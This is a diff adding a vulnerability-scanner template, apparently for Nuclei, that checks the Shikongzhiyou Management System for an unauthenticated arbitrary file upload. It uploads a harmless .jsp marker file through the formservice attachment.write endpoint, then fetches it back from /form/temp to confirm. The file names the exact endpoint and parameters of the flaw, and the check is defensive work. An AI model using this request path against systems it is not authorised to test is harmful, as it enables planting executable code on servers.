@@ -1,0 +1,51 @@
+id: shikongzhiyou-arbitrary-file-upload
+info:
+  name: Shikongzhiyou Management System Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Arbitrary File Upload vulnerability in Shikongzhiyou Management System, which allows unauthorized users to upload malicious files.
+
+variables:
+  v1: "{{md5(rand_base(5))}}"
+  v2: "{{rand_base(5)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/formservice?service=attachment.write&isattach=false&filename={{v2}}.jsp"
+    body: "test-{{v1}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{v2}}"
+    extractors:
+      - type: regex
+        name: fname
+        regex:
+          - "<root>(.*?)</root>"
+        group: 1
+        internal: true
+
+  - id: validate-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/form/temp/{{fname}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{v1}}"
